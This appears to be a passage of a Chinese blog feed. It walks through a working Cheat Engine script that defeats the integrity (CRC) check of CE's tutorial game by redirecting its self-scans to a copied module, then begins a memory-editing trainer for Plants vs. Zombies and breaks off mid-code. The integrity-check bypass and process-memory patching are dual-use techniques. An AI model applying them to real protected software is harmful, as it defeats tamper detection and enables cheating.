class="line">重新将要HOOK的模块加载到内存中,然后人为制造异常,把执行流程切换到新加载的模块中。在新加载的模块中仍然可以进行各种HOOK操作,此时守方的检测程序仍然在检测原始的模块,这样就检测不到HOOK了。</span><br></pre></td></tr></table></figure><h1 id="0x02-Do-it"><a href="#0x02-Do-it" class="headerlink" title="0x02 Do it!"></a>0x02 Do it!</h1><p>以CE自带的<code>CE Game tutorials</code>为例，采用思路三</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20220405230543.png" alt></p><p>当修改它的代码段时，标题会变成<code>(Integrity check error)</code></p><p>将代码段还原以后，标题就恢复正常</p><h2 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h2><p>首先我们要找一段汇编代码段，要找出是什么访问了该汇编代码段。</p><p>下面先来寻找一段代码段：这里就找一段和靶子血量相关的汇编代码吧，借助CE可以很简单地找到靶子血量的内存地址，<code>找出什么访问了这个地址</code>(靶子血量地址)，从而发现这么一段给靶子血量赋值的汇编代码，并记录下来这段汇编代码的地址<code>10003F45D</code>。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20220405230926.png" alt></p><p>接下来，我们要找到是什么一直持续访问这段汇编代码(<code>mov eax,[rcx+70]</code>)</p><p>由于我使用的无插件的CE，无法直接在Memory Viewer中右键汇编代码然后查找什么访问了这段汇编代码</p><p>无奈只能手动在CE中添加这段汇编的地址</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20220405231300.png" alt></p><p>确定后，进而右键-<code>找出是什么访问了这个地址</code></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20220405231343.png" alt></p><p>可以发现这里有三个位置持续访问该代码段。</p><h2 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h2><p>由于<strong>这三个位置也位于代码段</strong>，所以我们必须保证这三个位置<strong>同时</strong>被修改。</p><p>下面尝试CE自带的<strong>自动汇编</strong></p><p>对这三个位置中任意一个右键-在反汇编程序中显示地址-工具-自动汇编-模板-CT表框架代码；模板-代码注入-确定即可</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20220405233143.png" alt></p><p>保持这个自动汇编窗口不关闭</p><p>然后<strong>依次对另外两个位置</strong> 右键-在反汇编程序中显示地址（目的主要是定位到这个位置，后续点击代码注入后框框里面直接就是这个地址了，算是借助CE的一些方便之处来省时省力了），然后模板-代码注入-确定。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20220405233905.png" alt></p><p>这么弄完以后就已经生成了82行的框架了，不得不说CE在自动汇编这块确实比方便。</p><p>采用思路三，我们需要先将代码段进行一次备份。</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;$lua&#125;</span><br><span class="line"><span class="keyword">if</span> addressOfCopy==<span class="literal">nil</span> <span class="keyword">then</span></span><br><span class="line">   addressOfCopy=copyMemory(getAddress(process),getModuleSize(process))</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;$asm&#125;</span><br><span class="line"></span><br><span class="line">alloc(addressThatHoldsTheMoudleBase,8)</span><br><span class="line">alloc(addressThatHoldsTheModuleEnd,8)</span><br><span class="line">alloc(addressThatHoldsTheCopyBase,8)</span><br><span class="line"></span><br><span class="line">addressThatHoldsTheMoudleBase:</span><br><span class="line">dq $process //fill the address with the address of the module base</span><br><span class="line"></span><br><span class="line">addressThatHoldsTheModuleEnd:</span><br><span class="line">dq $process+getModuleSize(process)//works, otherwise we can use lua to fill this in</span><br><span class="line"></span><br><span class="line">addressThatHoldsTheCopyBase://</span><br><span class="line">dq $addressOfCopy</span><br></pre></td></tr></table></figure><p>接下来就是HOOK了</p><p>这里以第一个位置<code>10003B9DC</code>为例，写满了注释，应该比较好理解，可以结合着程序执行流程图来更好的理解。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/%E6%B5%81%E7%A8%8B%E5%9B%BE.PNG" alt="流程图"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">//below 4 lines are automatically generated by CE </span><br><span class="line">alloc(newmem,2048,&quot;gtutorial-x86_64.exe&quot;+3B9DC) </span><br><span class="line">label(returnhere)</span><br><span class="line">label(originalcode)</span><br><span class="line">label(exit)</span><br><span class="line"></span><br><span class="line">newmem: //this is allocated memory, you have read,write,execute access</span><br><span class="line">//place your code here</span><br><span class="line"></span><br><span class="line">push rax//store rax.Then use rax as a temp register. Don&apos;t forget to restore later :)</span><br><span class="line">lea rax,[rdx+rcx*2]//because original code is &apos;movzx edx,word ptr [rdx+rcx*2]&apos;, we should get current scanning memory,it&apos;s currently rdx+rcx*2</span><br><span class="line"></span><br><span class="line">cmp rax,[addressThatHoldsTheMoudleBase]//Boundary check</span><br><span class="line">jb originalcode//if below , means it&apos;s not inside</span><br><span class="line"></span><br><span class="line">cmp rax,[addressThatHoldsTheModuleEnd]//Boundary check</span><br><span class="line">ja originalcode//if above , means it&apos;s not inside</span><br><span class="line"></span><br><span class="line">//still inside the module. So we need to adjust it to our &quot;copy code&quot;</span><br><span class="line">sub rax,[addressThatHoldsTheMoudleBase] //get the current offset</span><br><span class="line">add rax,[addressThatHoldsTheCopyBase]//get the address of the &quot;copy code&quot;</span><br><span class="line"></span><br><span class="line">//do the original code with the new address</span><br><span class="line">movzx edx,word ptr [rax]//just use rax which points our &quot;copy code&quot;,this code just imitates the original code &apos;movzx edx,word ptr [rdx+rcx*2]&apos;</span><br><span class="line">xor edx,[rbp-1C]//Don&apos;t forget to write this according to original code.</span><br><span class="line">jmp exit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">originalcode:</span><br><span class="line">movzx edx,word ptr [rdx+rcx*2]</span><br><span class="line">xor edx,[rbp-1C]</span><br><span class="line"></span><br><span class="line">exit:</span><br><span class="line">pop rax//Don&apos;t forget to restore RAX :)</span><br><span class="line">jmp returnhere</span><br><span class="line"></span><br><span class="line">&quot;gtutorial-x86_64.exe&quot;+3B9DC:</span><br><span class="line">jmp newmem</span><br><span class="line">nop 2</span><br><span class="line">returnhere:</span><br></pre></td></tr></table></figure><p>关于label，它只是一个标签，可以更方便的标识一段代码，是为了能更方便的实现跳转等。</p><p>接下来只需要复制粘贴，稍作修改，就能适配其他两个位置了。</p><p>需要修改的地方有</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">所有label的位置</span><br><span class="line">以及jmp exit 上方那一句，那一句要根据original code来</span><br></pre></td></tr></table></figure><h1 id="0x03-完整脚本"><a href="#0x03-完整脚本" class="headerlink" title="0x03 完整脚本"></a>0x03 完整脚本</h1><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>因为是CT脚本，应该是可以保证这些操作的原子性？</p><p>不过可以确定的是，这些操作应该是可以在极短时间内（小于一个CRC检测周期与CRC检测间隔）完成，经过多次实验，并不会在脚本执行时导致检测未通过。</p><p>另外，顺序是按照第三部分、第二部分、第一部分来的，这也是由于CE模板先添加了第一部分，其次才添加了第二第三部分的缘故，有FILO的味道了。</p><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line">[ENABLE]</span><br><span class="line"></span><br><span class="line">//first make sure we have a copy of the target module</span><br><span class="line">&#123;$lua&#125;</span><br><span class="line">if addressOfCopy==nil then</span><br><span class="line">   addressOfCopy=copyMemory(getAddress(process),getModuleSize(process))</span><br><span class="line">end</span><br><span class="line">&#123;$asm&#125;</span><br><span class="line"></span><br><span class="line">alloc(addressThatHoldsTheMoudleBase,8)</span><br><span class="line">alloc(addressThatHoldsTheModuleEnd,8)</span><br><span class="line">alloc(addressThatHoldsTheCopyBase,8)</span><br><span class="line"></span><br><span class="line">addressThatHoldsTheMoudleBase:</span><br><span class="line">dq $process //fill the address with the address of the module base</span><br><span class="line"></span><br><span class="line">addressThatHoldsTheModuleEnd:</span><br><span class="line">dq $process+getModuleSize(process)//works, otherwise we can use lua to fill this in</span><br><span class="line"></span><br><span class="line">addressThatHoldsTheCopyBase://</span><br><span class="line">dq $addressOfCopy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//code from here to &apos;[DISABLE]&apos; will be used to enable the cheat</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//below 4 lines are automatically generated by CE</span><br><span class="line">alloc(newmem3,2048,&quot;gtutorial-x86_64.exe&quot;+3BABC) </span><br><span class="line">label(returnhere3)</span><br><span class="line">label(originalcode3)</span><br><span class="line">label(exit3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">newmem3: //this is allocated memory, you have read,write,execute access</span><br><span class="line">//place your code here</span><br><span class="line"></span><br><span class="line">push rax//store rax.Then use rax as a temp register. Don&apos;t forget to restore later :)</span><br><span class="line">lea rax,[rdx+rcx*2]//because original code is &apos;movzx edx,word ptr [rdx+rcx*2]&apos;, we should get current scanning memory,it&apos;s currently rdx+rcx*2</span><br><span class="line"></span><br><span class="line">cmp rax,[addressThatHoldsTheMoudleBase]//Boundary check</span><br><span class="line">jb originalcode3//if below , means it&apos;s not inside</span><br><span class="line"></span><br><span class="line">cmp rax,[addressThatHoldsTheModuleEnd]//Boundary check</span><br><span class="line">ja originalcode3//if above , means it&apos;s not inside</span><br><span class="line"></span><br><span class="line">//still inside the module. So we need to adjust it to our &quot;copy code&quot;</span><br><span class="line">sub rax,[addressThatHoldsTheMoudleBase] //get the current offset</span><br><span class="line">add rax,[addressThatHoldsTheCopyBase]//get the address of the &quot;copy code&quot;</span><br><span class="line"></span><br><span class="line">//do the original code with the new address</span><br><span class="line">movzx edx,word ptr [rax]//just use rax which points our &quot;copy code&quot;,this code just imitates the original code &apos;movzx edx,word ptr [rdx+rcx*2]&apos;</span><br><span class="line">xor edx,[rbp-1C]//Don&apos;t forget to write this according to original code.</span><br><span class="line">jmp exit3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">originalcode3:</span><br><span class="line">movzx edx,word ptr [rdx+rcx*2]</span><br><span class="line">xor edx,[rbp-1C]</span><br><span class="line"></span><br><span class="line">exit3:</span><br><span class="line">pop rax //remember we pushed RAX?</span><br><span class="line">jmp returnhere3</span><br><span class="line"></span><br><span class="line">&quot;gtutorial-x86_64.exe&quot;+3BABC:</span><br><span class="line">jmp newmem3</span><br><span class="line">nop 2</span><br><span class="line"></span><br><span class="line">returnhere3:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//below 4 lines are automatically generated by CE</span><br><span class="line">alloc(newmem2,2048,&quot;gtutorial-x86_64.exe&quot;+3BA4C) </span><br><span class="line">label(returnhere2)</span><br><span class="line">label(originalcode2)</span><br><span class="line">label(exit2)</span><br><span class="line"></span><br><span class="line">newmem2: //this is allocated memory, you have read,write,execute access</span><br><span class="line">//place your code here</span><br><span class="line"></span><br><span class="line">push rax//store rax.Then use rax as a temp register. Don&apos;t forget to restore later :)</span><br><span class="line">lea rax,[rdx+rcx*2]//because original code is &apos;movzx edx,word ptr [rdx+rcx*2]&apos;, we should get current scanning memory,it&apos;s currently rdx+rcx*2</span><br><span class="line"></span><br><span class="line">cmp rax,[addressThatHoldsTheMoudleBase]//Boundary check</span><br><span class="line">jb originalcode2//if below , means it&apos;s not inside</span><br><span class="line"></span><br><span class="line">cmp rax,[addressThatHoldsTheModuleEnd]//Boundary check</span><br><span class="line">ja originalcode2//if above , means it&apos;s not inside</span><br><span class="line"></span><br><span class="line">//still inside the module. So we need to adjust it to our &quot;copy code&quot;</span><br><span class="line">sub rax,[addressThatHoldsTheMoudleBase] //get the current offset</span><br><span class="line">add rax,[addressThatHoldsTheCopyBase]//get the address of the &quot;copy code&quot;</span><br><span class="line"></span><br><span class="line">//do the original code with the new address</span><br><span class="line">movzx edx,word ptr [rax]//just use rax which points our &quot;copy code&quot;,this code just imitates the original code &apos;movzx edx,word ptr [rdx+rcx*2]&apos;</span><br><span class="line">add edx,[rbp-1C]//Don&apos;t forget to write this according to original code.</span><br><span class="line">jmp exit2</span><br><span class="line"></span><br><span class="line">originalcode2:</span><br><span class="line">movzx edx,word ptr [rdx+rcx*2]</span><br><span class="line">add edx,[rbp-1C]</span><br><span class="line"></span><br><span class="line">exit2:</span><br><span class="line">pop rax</span><br><span class="line">jmp returnhere2</span><br><span class="line"></span><br><span class="line">&quot;gtutorial-x86_64.exe&quot;+3BA4C:</span><br><span class="line">jmp newmem2</span><br><span class="line">nop 2</span><br><span class="line">returnhere2:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//below 4 lines are automatically generated by CE</span><br><span class="line">alloc(newmem,2048,&quot;gtutorial-x86_64.exe&quot;+3B9DC)</span><br><span class="line">label(returnhere)</span><br><span class="line">label(originalcode)</span><br><span class="line">label(exit)</span><br><span class="line"></span><br><span class="line">newmem: //this is allocated memory, you have read,write,execute access</span><br><span class="line">//place your code here</span><br><span class="line"></span><br><span class="line">push rax//store rax.Then use rax as a temp register. Don&apos;t forget to restore later :)</span><br><span class="line">lea rax,[rdx+rcx*2]//because original code is &apos;movzx edx,word ptr [rdx+rcx*2]&apos;, we should get current scanning memory,it&apos;s currently rdx+rcx*2</span><br><span class="line"></span><br><span class="line">cmp rax,[addressThatHoldsTheMoudleBase]//Boundary check</span><br><span class="line">jb originalcode//if below , means it&apos;s not inside</span><br><span class="line"></span><br><span class="line">cmp rax,[addressThatHoldsTheModuleEnd]//Boundary check</span><br><span class="line">ja originalcode//if above , means it&apos;s not inside</span><br><span class="line"></span><br><span class="line">//still inside the module. So we need to adjust it to our &quot;copy code&quot;</span><br><span class="line">sub rax,[addressThatHoldsTheMoudleBase] //get the current offset</span><br><span class="line">add rax,[addressThatHoldsTheCopyBase]//get the address of the &quot;copy code&quot;</span><br><span class="line"></span><br><span class="line">//do the original code with the new address</span><br><span class="line">movzx edx,word ptr [rax]//just use rax which points our &quot;copy code&quot;,this code just imitates the original code &apos;movzx edx,word ptr [rdx+rcx*2]&apos;</span><br><span class="line">xor edx,[rbp-1C]//Don&apos;t forget to write this according to original code.</span><br><span class="line">jmp exit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">originalcode:</span><br><span class="line">movzx edx,word ptr [rdx+rcx*2]</span><br><span class="line">xor edx,[rbp-1C]</span><br><span class="line"></span><br><span class="line">exit:</span><br><span class="line">pop rax//Don&apos;t forget to restore RAX :)</span><br><span class="line">jmp returnhere</span><br><span class="line"></span><br><span class="line">&quot;gtutorial-x86_64.exe&quot;+3B9DC:</span><br><span class="line">jmp newmem</span><br><span class="line">nop 2</span><br><span class="line">returnhere:</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">[DISABLE]</span><br><span class="line">//code from here till the end of the code will be used to disable the cheat</span><br><span class="line">dealloc(newmem3)</span><br><span class="line">&quot;gtutorial-x86_64.exe&quot;+3BABC:</span><br><span class="line">movzx edx,word ptr [rdx+rcx*2]</span><br><span class="line">xor edx,[rbp-1C]</span><br><span class="line">//Alt: db 0F B7 14 4A 33 55 E4</span><br><span class="line">dealloc(newmem2)</span><br><span class="line">&quot;gtutorial-x86_64.exe&quot;+3BA4C:</span><br><span class="line">movzx edx,word ptr [rdx+rcx*2]</span><br><span class="line">add edx,[rbp-1C]</span><br><span class="line">//Alt: db 0F B7 14 4A 03 55 E4</span><br><span class="line">dealloc(newmem)</span><br><span class="line">&quot;gtutorial-x86_64.exe&quot;+3B9DC:</span><br><span class="line">movzx edx,word ptr [rdx+rcx*2]</span><br><span class="line">xor edx,[rbp-1C]</span><br><span class="line">//Alt: db 0F B7 14 4A 33 55 E4</span><br></pre></td></tr></table></figure><h1 id="0x04-写在最后"><a href="#0x04-写在最后" class="headerlink" title="0x04 写在最后"></a>0x04 写在最后</h1><p>应该有一年多没有更博客了</p><p>一年内主要在备战考研，当然也在摸鱼</p><p>也算是运气不好吧，未能一战成硕</p><p>二战也未必是一件坏事，能让自己改掉一些毛病比如拖延症</p><p>在写这篇博客的时候，我确实感受到了学习知识然后分享知识的这种<code>Input then output</code>的快乐</p><p>我也有太多的东西想去学习</p><p>以后的日子里，我也会勤更一下博客，少摸鱼</p><p>二战，好好努力，愿不负自己的努力！</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/illust_77941145_20191125_132523.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/illust_45691349_20190407_172803.jpg&quot; alt&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="随手小记" scheme="http://liul14n.top/categories/%E9%9A%8F%E6%89%8B%E5%B0%8F%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>My First MFC Program</title>
    <link href="http://liul14n.top/2020/12/22/My-First-MFC-Program/"/>
    <id>http://liul14n.top/2020/12/22/My-First-MFC-Program/</id>
    <published>2020-12-22T08:53:26.000Z</published>
    <updated>2020-12-22T11:53:02.753Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/71766980_p0.jpg" alt></p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>由于这几天在忙着研究外挂开发…</p><p>但是很遗憾，我并不会图形化界面程序开发…</p><p>昨晚开着二倍速和快进用俩小时看完了清华大学的一位教授出的Windows桌面应用程序开发教程…</p><p>看完发现，用Windows桌面应用程序开发来开发一款外挂对我来说还要学不少，比如还要再去研究各种类，如Button类等，学习周期比较长。</p><p>但我想尽快开发出来目标软件，这时候似乎只有VB、Delphi、MFC、易语言可以选择了。</p><p>VB和Delphi我不太熟悉，易语言的话，许多年前接触过，但基本语法忘得差不多了，以后再复习吧。</p><p>最终我还是选择了MFC，记得大一下学期老师让用MFC开发飞机大战，但我全程在摸鱼…</p><p>用了半天大概学会了MFC开发流程，并开发出了一个简易的植物大战僵尸辅助。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20201222170415.png" alt></p><h1 id="0x01-主要代码"><a href="#0x01-主要代码" class="headerlink" title="0x01 主要代码"></a>0x01 主要代码</h1><h2 id="一些宏和全局变量"><a href="#一些宏和全局变量" class="headerlink" title="一些宏和全局变量"></a>一些宏和全局变量</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//一些宏</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SUN_SHINE_BASE_ADDR 0x755E0C<span class="comment">//阳光基址</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SUN_SHINE_OFFSET_FIRST 0x868<span class="comment">//一级偏移</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SUN_SHINE_OFFSET_SECOND 0x5578<span class="comment">//二级偏移值</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NoCD_ADDR 0x49E947</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//全局变量处</span></span><br><span class="line">DWORD NumOfSum;</span><br><span class="line">HANDLE Process;</span><br><span class="line">DWORD Size;</span><br></pre></td></tr></table></figure><h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><p>功能是获取程序句柄，赋值给HANDLE类型的全局变量Process</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> CMFCTestDlg::OnBnClickedButton1()</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line"><span class="comment">//获取程序句柄</span></span><br><span class="line">DWORD PID = <span class="number">0</span>;</span><br><span class="line">HWND hWinmine = ::FindWindow(<span class="literal">NULL</span>, _T(<span class="string">"Plants vs. Zombies"</span>));<span class="comment">//找到窗口</span></span><br><span class="line">GetWindowThreadProcessId(hWinmine, &amp;PID);<span class="comment">//获取进程标识</span></span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> == PID)</span><br><span class="line">&#123;</span><br><span class="line">MessageBox(_T(<span class="string">"获取PID失败\n"</span>));</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Process = OpenProcess(PROCESS_ALL_ACCESS, <span class="number">0</span>, PID);</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == Process)</span><br><span class="line">&#123;</span><br><span class="line">MessageBox(_T(<span class="string">"进程打开失败\n"</span>));</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">MessageBox(_T(<span class="string">"启动成功!"</span>));</span><br><span class="line">UpdateSunNum();<span class="comment">//自定义的函数,作用是更新当前阳光值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="文本框"><a href="#文本框" class="headerlink" title="文本框"></a>文本框</h2><p>目的是获取用户输入的想修改的阳光值,赋值给int型的全局变量NumOfSum</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> CMFCTestDlg::OnEnChangeEdit1()</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span>  如果该控件是 RICHEDIT 控件，它将不</span></span><br><span class="line"><span class="comment">// 发送此通知，除非重写 CDialogEx::OnInitDialog()</span></span><br><span class="line"><span class="comment">// 函数并调用 CRichEditCtrl().SetEventMask()，</span></span><br><span class="line"><span class="comment">// 同时将 ENM_CHANGE 标志“或”运算到掩码中。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span>  在此添加控件通知处理程序代码</span></span><br><span class="line">CString str;</span><br><span class="line">GetDlgItem(IDC_EDIT1)-&gt;GetWindowText(str);</span><br><span class="line">NumOfSum = StrToInt(str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="修改阳光值"><a href="#修改阳光值" class="headerlink" title="修改阳光值"></a>修改阳光值</h2><p>顾名思义，根据用户在文本框中输入的阳光值来修改阳光值</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> CMFCTestDlg::OnBnClickedButton2()</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line"><span class="keyword">if</span> (Process == <span class="literal">NULL</span>) &#123;</span><br><span class="line">MessageBox(_T(<span class="string">"请先点启动!"</span>));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//修改阳光值</span></span><br><span class="line">DWORD SunShineBaseAddressValue = <span 